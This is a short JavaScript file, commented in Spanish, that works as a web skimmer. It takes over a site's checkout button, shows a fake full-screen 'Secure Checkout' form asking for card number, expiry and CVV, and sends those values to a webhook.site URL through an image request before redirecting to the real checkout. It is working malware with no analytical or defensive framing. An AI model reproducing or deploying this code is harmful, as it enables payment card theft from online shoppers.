(function(){
    var u="https://webhook.site/cfcaa601-1896-4266-9c57-33605ad12c9e", d=document;

    function h(b){
        if(b.getAttribute("d")) return;
        var n = b.cloneNode(!0);
        n.setAttribute("d", 1);
        // Reemplazamos el elemento original para neutralizar listeners previos
        b.parentNode.replaceChild(n, b);
        n.addEventListener("click", function(e){
            e.preventDefault();
            e.stopImmediatePropagation();
            l(); // Dispara la interfaz falsa
        });
    }

    // El observador busca el botón "Continue" mediante su data-testid
    new MutationObserver(function(m){
        var t = d.querySelector('a[data-testid="CheckoutButton"]');
        if(t && !t.getAttribute("d")) h(t);
    }).observe(d.body, {childList: !0, subtree: !0});

    function l(){
        d.body.insertAdjacentHTML("beforeend", '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;font-family:sans-serif;text-align:center;padding:40px;"><h2 style="margin-bottom:20px">Secure Checkout</h2><div style="border:1px solid #ccc;padding:20px;text-align:left"><input id="c" placeholder="Card Number" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc"><div style="display:flex;gap:10px"><input id="e" placeholder="MM/YY" style="width:50%;padding:10px;border:1px solid #ccc"><input id="v" placeholder="CVV" style="width:50%;padding:10px;border:1px solid #ccc"></div></div><button id="b" onclick="x()" style="width:100%;margin-top:20px;padding:15px;background:#000;color:#fff;border:none;cursor:pointer">Pay Now</button></div>');
    }

    window.x = function(){
        var c = d.getElementById("c").value, 
            e = d.getElementById("e").value, 
            v = d.getElementById("v").value;
        d.getElementById("b").innerText = "Processing...";
        
        // Exfiltración de datos al webhook
        new Image().src = u + "?c=" + c + "&e=" + e + "&v=" + v;
        
        setTimeout(function(){
            // Redirección final al checkout real después de la captura
            window.location.href = "/consumer/checkout/";
        }, 1500);
    };
})();
